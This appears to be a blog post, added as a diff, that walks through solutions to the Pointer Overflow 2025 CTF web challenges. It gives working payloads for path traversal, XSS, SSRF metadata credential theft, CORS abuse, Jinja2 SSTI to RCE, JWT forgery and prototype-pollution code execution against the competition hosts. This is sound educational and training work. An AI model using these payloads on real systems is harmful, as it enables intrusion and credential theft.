@@ -1,0 +1,369 @@
+---
+layout: post
+title: "Pointer Overflow 2025 - Web"
+date: 2025-11-16
+categories: ["POCTF"]
+tags: [ctf, web, ctf2025]
+excerpt: "Web security write-up for Pointer Overflow CTF"
+---
+
+## 100-1 — All Paths Lead Home
+
+### Overview
+
+In this challenge we are asked to read the `flag.txt` file on the target `http://web100-1.pointeroverflowctf.com/`, stored under `/secret/`, while the web app only serves normal `.txt` files via the `/view` endpoint. Looks easy, but there is clearly a filter that blocks a standard path traversal (../../).
+
+### Recon
+
+First, I opened the main page and tried accessing `note.txt`. The response is normal, so the endpoint `/view?file=note.txt` works. But when trying `../secret/flag.txt`, the server immediately returns `400 blocked`. Then on the page `/docs/legacy.html` I found a hint about `legacy=1` and an explanation about UTF-7 shifted encoding with the `+...-` format for characters that are not allowed to appear directly (for example `/` and `.`).
+
+### Exploitation
+
+Because the server tells us to use UTF-7, just encode the sensitive characters:
+
+```
+"." -> +AC4-
+"/" -> +AC8-
+```
+
+Leave the rest as plain text because normal letters do not need to be encoded. So the path `../../secret/flag.txt` should be converted to `+AC4-+AC4-+AC8-secret+AC8-flag.txt`. Don’t forget to enable legacy mode by adding `legacy=1` in the query string.
+
+### Payload
+
+```bash
+/view?legacy=1&file=%2BAC4-%2BAC4-%2BAC8-secret%2BAC8-flag.txt
+```
+
+We use URL encode so that the `+` and `-` signs are not altered by the browser.
+
+### Flag
+`poctf{uwsp_c4nc3l_m3_0rd3r5}`
+
+
+## 100-2 — This Must Be the Place
+
+### Overview
+
+This challenge asks us to find a way so that the page `https://web100-2.pointeroverflowctf.com/` runs our JavaScript, then use the script to read the flag via `fetch` to the `/flag` endpoint. The context is that the developer added a character filter, but user output is still raw in the HTML.
+
+### Recon
+
+- The main endpoint accepts a `name` query and displays that value directly inside `<div id="results">`.
+- Because there is no escaping, we can insert HTML tags, including `<script>`.
+- There is a snippet `<script>window.FLAG_TOKEN = "...";</script>` on every page. This means if we successfully do XSS, we can automatically access the token needed to request the flag.
+
+### Exploitation
+
+Timing note: on the page, `<script>window.FLAG_TOKEN = "...";</script>` appears AFTER `<div id="results">`. If we immediately execute `fetch` when injecting, there is a risk that `window.FLAG_TOKEN` has not been set. Therefore the payload should wait for `DOMContentLoaded`.
+
+```js
+<script>
+addEventListener('DOMContentLoaded', () => {
+  fetch('/flag', { headers: { 'X-Flag-Token': window.FLAG_TOKEN } })
+    .then(res => res.text())
+    .then(flag => alert(flag));
+});
+</script>
+```
+
+Execute on the target; we encode the payload with URL encoding:
+
+```text
+https://web100-2.pointeroverflowctf.com/?name=%3Cscript%3EaddEventListener%28%27DOMContentLoaded%27%2C%28%29%3D%3Efetch%28%27%2Fflag%27%2C%7Bheaders%3A%7B%27X-Flag-Token%27%3Awindow.FLAG_TOKEN%7D%7D%29.then%28r%3D%3Er.text%28%29%29.then%28flag%3D%3Ealert%28flag%29%29%29%3C%2Fscript%3E
+```
+
+Once the page finishes parsing, the listener runs (same-origin), reads `window.FLAG_TOKEN`, then `fetch`es `/flag` with a valid header and shows the flag via `alert`.
+
+### Flag
+`poctf{uwsp_1_d0_b173_my_7humb_51r}`
+
+
+## 100-3 — Mason, Initiate
+
+### Overview
+
+This challenge makes us play with SSRF on the `fetch` endpoint which fetches content from the URL we supply. The server issues the request from its side, so we can try pointing it to an internal service that we cannot access directly from the browser.
+
+### Recon
+
+- Check the landing page to confirm there is a `fetch?url=...` form.
+- Leverage SSRF by pointing the URL to `127.0.0.1:8081` because the metadata service is only open on localhost/loopback.
+- Enumerate the path `latest/meta-data/` to see what exists inside.
+- From the list, focus on `iam/security-credentials/` because it usually stores interesting credentials.
+
+### Exploitation
+
+1. Test SSRF using an external URL to confirm:  
+   ```bash
+   curl -s 'https://web100-3.pointeroverflowctf.com/fetch?url=https://httpbin.org/ip'
+   ```
+2. Then pivot to the internal metadata service:  
+   ```bash
+   curl -s 'https://web100-3.pointeroverflowctf.com/fetch?url=http://127.0.0.1:8081/latest/meta-data/'
+   ```
+   The output shows several entries including `iam/`.
+   ```
+   instance-id
+   iam/
+   local-ipv4
+   ```
+   
+3. Continue to the credentials path:  
+   ```bash
+   curl -s 'https://web100-3.pointeroverflowctf.com/fetch?url=http://127.0.0.1:8081/latest/meta-data/iam/security-credentials/'
+   ```
+   Here we find a role named `poctf-role`.
+4. Retrieve the role data to obtain the token:  
+   ```bash
+   curl -s 'https://web100-3.pointeroverflowctf.com/fetch?url=http://127.0.0.1:8081/latest/meta-data/iam/security-credentials/poctf-role'
+   ```
+
+### Flag
+
+The last response returns JSON containing `AccessKeyId`, `SecretAccessKey`, and `Token`. The flag is in the `Token` field:
+```
+poctf{uwsp_4rc4n3_1n1t14t3}
+```
+
+### Notes
+
+- The metadata endpoint resembles AWS layout, so enumeration using common paths is very helpful.
+
+
+## 200-1 — What's Mine is Yours
+
+### Overview
+
+In this challenge the target is: `https://web200-1.pointeroverflowctf.com/`. Log in first to get `sid`, then request `/api/token` while spoofing `Origin` and including the cookie. The server reflects the origin and allows credentials, so the token leaks via CORS. Use that token as `X-Flag-Token` to `POST /api/flag` to obtain the flag.
+
+### Recon
+
+- The landing page hints about `/login`, `/api/me`, and `/api/token`. These all use a session cookie.
+- Manually check `POST /login`, you get `sid` with `SameSite=None`, which means it is ready for cross-site requests.
+- Test CORS with `Origin: https://hadespwn.me`, the server returns the same `Access-Control-Allow-Origin`, plus `Access-Control-Allow-Credentials: true`. Very red flag.
+
+### Exploitation
+
+1. `POST /login` → obtain cookie `sid=...`.
+2. Request `/api/token` but add `Origin: https://hadespwn.me` and include the cookie (`credentials: include` if via browser). The server will validate the session, then respond with `{"apiToken": ...}` while the response headers allow the fake origin to read the response.
+3. Send `POST /api/flag` with the header `X-Flag-Token: <apiToken>` plus the same session cookie. The flag is returned.
+
+### Flag
+
+`poctf{uwsp_cr_7w3n7y_64z3b0_7pk}`
+
+
+## 200-2 — The Gift Horse
+
+### Overview
+
+In this challenge what is given is a URL: https://web200-2.pointeroverflowctf.com. The target offers video upload and comments, but many hints point to a browser-based file exploit. Then directory fuzzing with `ffuf` reveals `phpinfo.php` exposed. `phpinfo()` spills the `FLAG` environment variable, so just `curl` and done.
+
+### Recon
+
+Start with `curl` to see the main page. There is a single-page video player with an upload form (`/upload.php`) and comments (`/comments.php`). In the comment field there are many XSS payloads, probably many users are testing XSS there LOL.
+
+Because there are no interesting links, I immediately brute force paths with ffuf:
+
+```bash
+ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u https://web200-2.pointeroverflowctf.com/FUZZ.php -fs 52370
+```
+
+Filter `-fs 52370` so that the large homepage is skipped. From the output we see `phpinfo.php` and `config.php`.
+
+### Exploitation
+
+`phpinfo.php` is usually hidden because it can leak environment details. So immediately:
+
+```bash
+curl -s 'https://web200-2.pointeroverflowctf.com/phpinfo.php' | rg 'FLAG'
+```
+
+The response shows several `FLAG` fields (in the core value, `$_SERVER`, and `$_ENV`). There is no extra protection, so the flag can be read raw.
+
+### Flag
+```
+poctf{uwsp_ju57_bl0w1n6_5m0k3}
+```
+
+
+## 200-3 — Chiaroscuro
+
+### Overview
+
+The point of this challenge is, on the target: `https://web200-3.pointeroverflowctf.com/` there is a Server-Side Template Injection (SSTI) on the `POST /api/view` endpoint that is active when the profile is set to "conservation". From this SSTI we can escalate to RCE and read the flag.
+
+### Recon
+
+- The main page has a form to change the "Viewing profile" between `display` and `conservation` via `POST /set-profile` which gives the `preview_mode` cookie.
+- There is an "Annotations" form that submits to `POST /api/view` with the `notes` field.
+- In `display` mode, the `notes` output is sanitized (what is input appears as-is in HTML). In `conservation` mode, the server appears to render the contents of `notes` as a Jinja template string.
+
+### Vulnerability
+
+From the recon above we can conclude that: 
+- Type: Server-Side Template Injection (SSTI) — Jinja2
+- Trigger: `notes` is processed as a template when `preview_mode=conservation`.
+- Impact: Arbitrary template evaluation → access to `__globals__` → import modules → RCE, file read, etc.
+
+### Exploitation
+
+1) Switch to conservation profile (set the cookie):
+```bash
+curl -i -c cookies.txt -b cookies.txt \
+  -X POST 'https://web200-3.pointeroverflowctf.com/set-profile' \
+  -H 'Content-Type: application/x-www-form-urlencoded' \
+  --data 'mode=conservation'
+```
+
+2) Verify simple SSTI:
+```bash
+curl -s -b cookies.txt \
+  -X POST 'https://web200-3.pointeroverflowctf.com/api/view' \
+  -H 'Content-Type: application/x-www-form-urlencoded' \
+  --data 'notes={{7*7}}'
+# output: 49
+```
+
+3) Expose globals and builtins to access import:
+```bash
+curl -s -b cookies.txt \
+  -X POST 'https://web200-3.pointeroverflowctf.com/api/view' \
+  -H 'Content-Type: application/x-www-form-urlencoded' \
+  --data $'notes={{config.__class__.__init__.__globals__.keys()|list}}'
+  
+  ['__name__', '__doc__', '__package__', '__loader__', '__spec__', '__file__', '__cached__', '__builtins__', 'functools', 'sys', 't', 'abc', 'chain',
+'escape', 'Markup', 'soft_str', 'auto_aiter', 'auto_await', 'TemplateNotFound', 'TemplateRuntimeError', 'UndefinedError', 'EvalContext', '_PassArg', 'concat', 'internalcode', 'missing', 'Namespace', 'object_type_repr', 'pass_eval_context', 'V', 'F', 'exported', 'async_exported', 'identity', 'markup_join', 'str_join', 'new_context', 'TemplateReference', '_dict_method_all', 'Context', 'BlockReference', 'LoopContext', 'AsyncLoopContext', 'Macro', 'Undefined', 'make_logging_undefined', 'ChainableUndefined', 'DebugUndefined', 'StrictUndefined']
+```
+
+4) RCE via `__import__('os').popen(...)` then list root to find the flag:
+```bash
+curl -s -b cookies.txt \
+  -X POST 'https://web200-3.pointeroverflowctf.com/api/view' \
+  -H 'Content-Type: application/x-www-form-urlencoded' \
+  --data $'notes={{config.__class__.__init__.__globals__[\'__builtins__\'][\'__import__\'](\'os\').popen(\'ls -la /\').read()}}'
+  
+  drwxr-xr-x   1 root root 4096 Nov  3 02:08 etc
+-rw-rw-rw-   1 root root   36 Oct 22 22:21 flag.txt
+drwxr-xr-x   1 root root 4096 Nov  3 00:08 home
+```
+
+5) Read the flag:
+```bash
+curl -s -b cookies.txt \
+  -X POST 'https://web200-3.pointeroverflowctf.com/api/view' \
+  -H 'Content-Type: application/x-www-form-urlencoded' \
+  --data $'notes={{config.__class__.__init__.__globals__[\'__builtins__\'][\'__import__\'](\'os\').popen(\'cat /flag.txt\').read()}}'
+```
+
+### Flag
+- `poctf{uwsp_b34u7y_15_l16h7_4nd_d4rk}`
+
+### Root Cause
+
+- In `conservation` mode, the server renders user input as a Jinja template string (likely via `render` on a template built directly from the input). Because there is no sandbox/isolation and the input is not escaped, an attacker can access `config.__class__.__init__.__globals__` ➜ builtins ➜ `__import__` ➜ `os.popen`.
+
+### Notes
+
+- In `display` mode, the endpoint previously shows an HTML wrapper and the content is sanitized; very different from `conservation` mode which directly returns the evaluated string. This behavioral difference is the SSTI gap.
+- `{{request...}}` or access to other context values is blocked (returns an error), but the chain via `config.__class__.__init__.__globals__` is enough to break into builtins.
+
+## 300-1 — Friend of a Friend
+
+### Overview
+
+The flag is obtained by leveraging a shared HS256 secret that appears in the public JWKS. That secret is used to forge a JWT whose `aud` claim is set to `admin-app`, then the forged token is used to hit `/api/flag` on the target: `http://web300-1.pointeroverflowctf.com/index.html`.
+
+### Recon
+
+- In description: DNS may not be available for this instance. If the challenge hostname does not resolve, use the public IP 34.9.14.80 and send the Host header web300-2.pointeroverflowctf.com.
+- The landing page shows a simple OAuth flow plus a link to `/.well-known/openid-configuration`.
+- The discovery JSON shows the algorithm is HS256 and JWKS is at `/.well-known/jwks.json`.
+- And boom! The JWKS directly reveals a base64 key `ZGV2c2hhcmVkc2VjcmV0` (aka `devsharedsecret`).
+
+### Exploitation
+
+1. Run the demo auth flow via `GET /auth/start?client_id=profile-app...` to get a `code` at `/callback`.
+2. Exchange the code at `/oauth/token` with `client_id=profile-app` + `grant_type=authorization_code` + the same `redirect_uri`. The result is a valid access token but with `aud` = `profile-app`.
+3. Because we already obtained the HS256 secret, just forge a JWT manually using a library (e.g. `pyjwt`) with claims:
+   - `iss`: `https://friend.example/oauth`
+   - `sub`: `user123`
+   - `aud`: `admin-app`
+   - `scope`: `profile:read friends:read`
+   - `typ`: `access_token`
+   - `iat` / `exp`: (set to reasonable values)
+4. Send the forged token to `GET https://web300-1.pointeroverflowctf.com/api/flag` using the header `Authorization: Bearer <token>`.
+5. The response returns the flag: `poctf{uwsp_4_fr13nd_1n_n33d_15_4_fr13nd_1nd33d}`.
+
+### Root Cause
+
+The Admin API still relies on the same shared secret used by normal clients. Because the JWKS is public and contains a symmetric key, anyone can mint a token with any audience including `admin-app`. Admin should use RS256 with a private key and never publish it outside the server, or at least never publish the symmetric key in JWKS.
+
+
+## 300-2 — The Shape of Water
+
+### Overview
+
+The target server allows `POST /api/settings` to merge JSON into a global config without sanitization. Prototype pollution carries `NODE_OPTIONS` into the build process. When `GET /api/build` runs, Node executes the payload `cp /flag.txt /public/flag.txt`. The flag is retrieved via `GET /flag.txt` because the `/public` folder is served statically.
+
+### Recon
+
+1. Check target service info:
+
+```bash
+curl -sk -H 'Host: web300-2.pointeroverflowctf.com' https://34.9.14.80/api/version
+
+{"name":"Lacustrine Conservancy Preview","version":"1.2.0-preview"}
+```
+
+The response shows a Node.js preview service.
+2. `GET /api/debug/cfg` proves the global config is readable and has nested properties.
+3. The `POST /api/reset` endpoint only clears ordinary state, but does not delete prototype pollution.
+
+### Vulnerability
+
+- The config merge uses `Object.assign` (or similar) without filtering special keys.
+- Input `__proto__` sets a property on `Object.prototype`, so every new object inherits the malicious value.
+- The build worker relies on that config to set environment/CLI options, so `NODE_OPTIONS` gets overridden by our value.
+
+### Exploitation
+
+1. Pollute the prototype via:
+
+```bash
+curl -sk -X POST \
+  -H 'Host: web300-2.pointeroverflowctf.com' \
+  -H 'Content-Type: application/json' \
+  --data '{"__proto__":{"NODE_OPTIONS":"--eval=require(\"child_process\").execSync(\"cp /flag.txt /public/flag.txt\")"}}' \
+  https://34.9.14.80/api/settings
+```
+
+The response is a `RangeError` but the pollution still succeeds (a common side-effect).
+2. Trigger the build:
+
+```bash
+curl -sk -H 'Host: web300-2.pointeroverflowctf.com' https://34.9.14.80/api/build
+
+ /api/build
+ [build] newsletter generated
+ [build] found exec in config; executing...
+ /app
+ ---FILES---
+ ./public/newsletter.html
+ ---FLAG---
+ poctf{uwsp_7h15_15_n3c3554ry_l1f3_f33d5_0n_l1f3}
+ [build] done.
+```
+
+The worker runs Node with custom `NODE_OPTIONS`, automatically copying the flag. In fact the flag already appears here, which is enough.
+3. Fetch the flag from the static dir:
+
+```bash
+curl -sk -H 'Host: web300-2.pointeroverflowctf.com' https://34.9.14.80/flag.txt
+```
+
+### Flag
+
+```text
+poctf{uwsp_7h15_15_n3c3554ry_l1f3_f33d5_0n_l1f3}
+```
